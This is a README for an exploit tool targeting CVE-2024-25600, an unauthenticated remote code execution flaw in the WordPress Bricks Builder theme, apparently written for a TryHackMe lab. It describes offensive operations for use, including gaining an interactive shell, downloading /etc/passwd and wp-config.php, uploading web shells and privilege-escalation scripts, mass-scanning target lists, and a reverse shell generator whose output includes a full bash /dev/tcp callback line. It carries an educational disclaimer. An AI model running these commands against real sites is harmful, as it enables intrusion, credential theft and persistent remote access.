# BrickBreaker

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![CVE](https://img.shields.io/badge/CVE--2024--25600-Critical-DC143C?style=for-the-badge&logo=security&logoColor=white)
![Version](https://img.shields.io/badge/Version-2.2.0-00D26A?style=for-the-badge)
![License](https://img.shields.io/badge/License-Educational-yellow?style=for-the-badge)

**WordPress Bricks Builder Remote Code Execution Exploit**

*Unauthenticated RCE with Interactive Shell Capability*

[Quick Start](#quick-start) •
[Installation](#installation) •
[Usage Guide](#usage-guide) •
[Technical Details](#technical-details) •
[Documentation](#documentation)

</div>

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Guide](#usage-guide)
  - [Basic Commands](#basic-commands)
  - [Advanced Options](#advanced-options)
  - [Interactive Shell](#interactive-shell)
- [Shell Commands Reference](#shell-commands-reference)
- [Batch Scanning](#batch-scanning)
- [Technical Details](#technical-details)
- [Troubleshooting](#troubleshooting)
- [Security & Disclaimer](#security--disclaimer)
- [References](#references)

---

## Overview

BrickBreaker is a security testing tool designed to exploit CVE-2024-25600, a critical unauthenticated remote code execution vulnerability in WordPress Bricks Builder theme versions ≤ 1.9.6. This tool provides penetration testers and security researchers with a stable, interactive shell environment for authorized security assessments.

### Vulnerability Information

| Property | Details |
|----------|---------|
| **CVE Identifier** | CVE-2024-25600 |
| **CVSS Score** | 9.8 (Critical) |
| **Vulnerability Type** | Unauthenticated Remote Code Execution |
| **Affected Versions** | Bricks Builder ≤ 1.9.6 |
| **Patched Version** | Bricks Builder 1.9.6.1+ |
| **Disclosure Date** | February 2024 |

---

## Features

### Core Capabilities

- **Multiple Payload Types**: Support for `code`, `container`, and `carousel` payloads to maximize compatibility
- **Interactive Shell**: Full pseudo-terminal experience with command history and persistent sessions
- **File Operations**: Bidirectional file transfer using base64 encoding
- **Reverse Shell Generator**: Built-in generator with multiple payload types (bash, python, nc, php, perl)
- **Batch Processing**: Mass vulnerability scanning from target lists
- **Professional UI**: Rich terminal interface with colored output and progress indicators
- **Optimized Performance**: HTTP connection pooling for reliable exploitation

### Technical Features

- Automatic nonce extraction
- Vulnerability verification
- Session persistence
- Error handling and recovery
- Connection pooling with httpx
- Customizable timeouts

---

## Installation

### Prerequisites

- Python 3.8 or higher
- pip package manager
- Network connectivity

### Standard Installation

```bash
# Create virtual environment
python3 -m venv brickbreaker

# Activate virtual environment
source brickbreaker/bin/activate

# Install dependencies
pip install httpx rich
```

### Repository Installation

```bash
# Clone repository
git clone https://github.com/h0w1tzxr/TryHack3M-Bricks-Heist.git

# Navigate to directory
cd TryHack3M-Bricks-Heist

# Install dependencies
pip install -r requirements.txt
```

### Dependencies

The tool requires the following Python packages:

- **httpx**: Modern asynchronous HTTP client library
- **rich**: Advanced terminal formatting and output

---

## Quick Start

### Basic Usage

```bash
python3 brickbreaker.py https://target.com
```

The exploit will automatically:

1. Extract the security nonce from the target
2. Verify vulnerability presence
3. Establish an interactive shell session

### Example Output

```
 ██████╗ ██████╗ ██╗ ██████╗██╗  ██╗    ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
 ██╔══██╗██╔══██╗██║██╔════╝██║ ██╔╝    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
 ██████╔╝██████╔╝██║██║     █████╔╝     ██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
 ██╔══██╗██╔══██╗██║██║     ██╔═██╗     ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
 ██████╔╝██║  ██║██║╚██████╗██║  ██╗    ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                   CVE-2024-25600 | RCE Exploit | v2.2.0 | by Constantines

✓ Nonce found: dce9f95a2a
✓ Target is VULNERABLE to CVE-2024-25600
  User: apache | Host: ip-10-81-181-56

╭─ BrickBreaker Shell ─────────╮
│ Shell established!           │
│ User: apache                 │
│ Host: ip-10-81-181-56        │
│ Type 'help' for commands     │
╰──────────────────────────────╯

apache@ip-10-81-181-56:/var/www/html$ 
```

---

## Usage Guide

### Basic Commands

| Command | Description | Example |
|---------|-------------|---------|
| Interactive shell | Launch interactive session | `python3 brickbreaker.py <url>` |
| Single command | Execute command and exit | `python3 brickbreaker.py <url> -c "id"` |
| Alternate payload | Use different payload type | `python3 brickbreaker.py <url> -p container` |
| Batch scan | Scan multiple targets | `python3 brickbreaker.py --scan targets.txt` |
| Help | Display usage information | `python3 brickbreaker.py -h` |

### Advanced Options

```bash
# Execute single command with minimal output
python3 brickbreaker.py https://target.com -c "cat /etc/passwd" -q

# Use container payload with custom timeout
python3 brickbreaker.py https://target.com -p container -t 60

# Batch scan with output file
python3 brickbreaker.py --scan targets.txt -o vulnerable.txt

# Carousel payload in quiet mode
python3 brickbreaker.py https://target.com -p carousel -q
```

### Command-Line Options Reference

```
usage: brickbreaker.py [-h] [-c COMMAND] [-p {code,container,carousel}]
                       [-t TIMEOUT] [-q] [--scan FILE] [-o OUTPUT] [-v]
                       [url]

positional arguments:
  url                       Target URL (e.g., https://target.com)

optional arguments:
  -h, --help                Show help message and exit
  -c, --command COMMAND     Execute single command and exit
  -p, --payload TYPE        Payload type: code (default), container, carousel
  -t, --timeout SECONDS     Request timeout in seconds (default: 30)
  -q, --quiet               Minimal output, suppress banner
  --scan FILE               Batch scan URLs from file
  -o, --output FILE         Save vulnerable URLs to file
  -v, --version             Show version information
```

### Interactive Shell

Once connected, you gain access to a full interactive shell environment with built-in commands for advanced operations.

---

## Shell Commands Reference

### Built-in Commands

| Command | Syntax | Description |
|---------|--------|-------------|
| **help** | `help` | Display available commands |
| **info** | `info` | Show session information (user, kernel, IP) |
| **clear** | `clear` | Clear terminal screen |
| **cd** | `cd <directory>` | Change working directory (persistent) |
| **download** | `download <filepath>` | Download file to local machine |
| **upload** | `upload <filepath>` | Upload local file to `/tmp/` on target |
| **revshell** | `revshell` | Generate and execute reverse shell |
| **exit** | `exit` | Terminate session |

### File Transfer Examples

#### Downloading Files

```bash
# Download configuration file
apache@target:/var/www/html$ download wp-config.php
✓ Downloaded: wp-config.php (3847 bytes)

# Download system file
apache@target:/var/www/html$ download /etc/passwd
✓ Downloaded: passwd (1245 bytes)
```

#### Uploading Files

```bash
# Upload privilege escalation script
apache@target:/var/www/html$ upload linpeas.sh
✓ Uploaded to: /tmp/linpeas.sh

# Upload web shell
apache@target:/var/www/html$ upload shell.php
✓ Uploaded to: /tmp/shell.php
```

### Reverse Shell Generator

The built-in reverse shell generator supports multiple payload types:

```bash
apache@target:/var/www/html$ revshell

Your IP: 10.10.14.5
Your Port [4444]: 9001

╭──────────────── Reverse Shells ─────────────────╮
│ Type   │ Payload                                │
├────────┼────────────────────────────────────────┤
│ bash   │ nohup bash -c "bash -i >& /dev/tcp/... │
│ python │ nohup python3 -c 'import socket,sub... │
│ nc     │ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp... │
│ php    │ nohup php -r '$s=fsockopen("10.10....  │
│ perl   │ nohup perl -e 'use Socket;$i="10.1...  │
╰────────┴────────────────────────────────────────╯

Execute which? [bash/python/nc/php/perl/none]: bash

Start listener first: nc -lvnp 9001
Continue? [y/n]: y

Executing: nohup bash -c "bash -i >& /dev/tcp/10.10.14.5/9001 0>&1" &
✓ Reverse shell payload sent!
Check your listener for connection
```

**Note**: All reverse shells are backgrounded with `nohup ... &` to prevent HTTP timeout issues.

---

## Batch Scanning

### Basic Scanning

Create a target list and scan for vulnerabilities:

```bash
# Create targets file
cat > targets.txt << EOF
https://site1.com
https://site2.com
https://site3.com
EOF

# Execute batch scan
python3 brickbreaker.py --scan targets.txt
```

### Scan with Output

Save vulnerable targets to a file for further processing:

```bash
python3 brickbreaker.py --scan targets.txt -o vulnerable.txt
```

### Example Output

```
                   CVE-2024-25600 | RCE Exploit | v2.2.0 | by Constantines

Scanning 3 targets...

✓ VULNERABLE: https://site1.com
✗ Not vulnerable: https://site2.com
✓ VULNERABLE: https://site3.com

Results: 2/3 vulnerable
Saved to: vulnerable.txt
```

---

## Technical Details

### Exploitation Process

```
┌─────────────────────────────────────────────────────────────────────────────┐
│  PHASE 1: RECONNAISSANCE                                                    │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ HTTP GET: https://target.com                                          │  │
│  │ Extract: nonce from bricksData JavaScript object                      │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  PHASE 2: PAYLOAD DELIVERY                                                  │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ HTTP POST: /wp-json/bricks/v1/render_element                          │  │
│  │ Payload: {"postId":"1", "nonce":"xxx", "element":{"settings":{...}}}  │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  PHASE 3: CODE EXECUTION                                                    │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ Vulnerable Function: prepare_query_vars_from_settings()               │  │
│  │ Execution Vector: PHP eval() → shell_exec($user_input)                │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│  PHASE 4: OUTPUT EXTRACTION                                                 │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ Parse HTTP Response: Extract data between BRKSTART...BRKEND markers   │  │
│  │ Return: Clean command output                                          │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Payload Types

| Type | Method | Use Case |
|------|--------|----------|
| **code** | Direct PHP code execution via `executeCode` | Default - Most reliable approach |
| **container** | Query injection via loop element | Fallback if code payload fails |
| **carousel** | Query injection via carousel element | Alternative fallback method |

### Security Mechanisms

The exploit implements several reliability features:

- **Automatic nonce extraction** from JavaScript objects
- **Vulnerability verification** before exploitation
- **Connection pooling** for stable HTTP sessions
- **Timeout handling** for slow or unreachable targets
- **Error recovery** with detailed error messages

---

## Troubleshooting

### Common Issues and Solutions

#### Issue: "Failed to extract nonce"

**Possible Causes:**
- Target does not use Bricks Builder theme
- Target is offline or unreachable
- Web Application Firewall (WAF) is blocking requests

**Solutions:**
- Verify target is accessible via browser
- Check if Bricks Builder is installed
- Review firewall logs for blocked requests

#### Issue: "Target does not appear vulnerable"

**Possible Causes:**
- Bricks Builder is patched (version ≥ 1.9.6.1)
- Default payload type incompatible with target configuration

**Solutions:**
- Try alternative payload types: `-p container` or `-p carousel`
- Verify Bricks Builder version
- Check target's security patches

#### Issue: Commands return empty output

**Possible Causes:**
- Command does not generate output (e.g., `touch`, `mkdir`)
- Output is being suppressed by error redirection

**Solutions:**
- Use verification commands like `ls` or `cat`
- Check command syntax and paths
- Verify command execution with exit status

#### Issue: Reverse shell not connecting

**Possible Causes:**
- Listener not started before execution
- Firewall blocking outbound connections
- Incorrect IP address or port

**Solutions:**
- Start listener before executing reverse shell
- Verify firewall rules on both ends
- Check network connectivity
- Try alternative shell payload types

---

## Security & Disclaimer

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                           IMPORTANT LEGAL NOTICE                             ║
║                                                                              ║
║  THIS TOOL IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY  ║
║                                                                              ║
║  • Only use on systems you own or have explicit written permission to test   ║
║  • Unauthorized access to computer systems is illegal in most jurisdictions  ║
║  • The author assumes no liability for misuse or damages caused by this tool ║
║  • Users are responsible for complying with all applicable laws              ║
║  • Always follow responsible disclosure practices                            ║
║                                                                              ║
║  By using this tool, you agree to use it responsibly and legally.            ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

### Responsible Use Guidelines

1. **Authorization**: Always obtain written permission before testing
2. **Scope**: Only test systems within the agreed scope
3. **Documentation**: Keep detailed logs of all testing activities
4. **Disclosure**: Report vulnerabilities to system owners promptly
5. **Privacy**: Respect user data and privacy during assessments

---

## References

### Official Resources

- [CVE-2024-25600 - National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2024-25600)
- [Original Security Disclosure - Snicco](https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6)
- [Bricks Builder Official Website](https://bricksbuilder.io/)
- [WordPress Security Best Practices](https://wordpress.org/support/article/hardening-wordpress/)

### Additional Resources

- [TryHackMe - Bricks Heist Room](https://tryhackme.com/room/introtosecurityarchitecture)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## Credits

### Development Team

| Role | Contributor |
|------|-------------|
| **Exploit Development** | [Constantines](https://github.com/h0w1tzxr) |
| **Vulnerability Research** | [Snicco Security](https://snicco.io) |
| **Original PoC Reference** | [Chocapikk](https://github.com/Chocapikk/CVE-2024-25600) |

### Acknowledgments

Special thanks to the security research community for their continued efforts in identifying and responsibly disclosing vulnerabilities.

---

## License

This project is provided for **educational purposes only**. See the repository for full license terms.

---

<div align="center">

**Developed by Constantines**

![Stars](https://img.shields.io/github/stars/h0w1tzxr/TryHack3M-Bricks-Heist?style=social)
![Forks](https://img.shields.io/github/forks/h0w1tzxr/TryHack3M-Bricks-Heist?style=social)

*If this project was helpful, please consider giving it a star!*

</div>
